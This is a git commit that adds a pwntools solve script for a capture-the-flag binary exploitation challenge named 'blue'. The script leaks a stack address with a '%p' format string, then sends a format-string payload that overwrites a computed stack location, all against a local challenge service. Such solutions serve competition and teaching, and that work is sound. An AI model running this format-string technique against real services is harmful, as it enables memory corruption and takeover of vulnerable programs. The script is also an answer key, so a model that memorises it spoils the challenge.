cea2692fbd23f9dce8eb90eed1291af07cbbf7b8
abdulrafirh <abdulrafi623@gmail.com>
2025-10-08 21:39:07 +0700

    feat: wave1 pwn chall 'blue'

---
+++ wave1/pwn/blue/src/solve.py
@@ -0,0 +1,20 @@
+from pwn import *
+
+context.arch = "AMD64"
+
+r = remote("localhost", 8555)
+
+r.sendline(b"%p")
+r.recvuntil(b"0x")
+
+stack_leak = int(r.recvline(), 16)
+target = stack_leak - 0x11
+
+info(f"Target obtained: {hex(target)}")
+
+payload = fmtstr_payload(14, {target : 0x4a47b85bed7a94d7}, write_size='short')
+print(f"Length of payload {len(payload)}")
+
+r.sendline(payload)
+
+r.interactive()
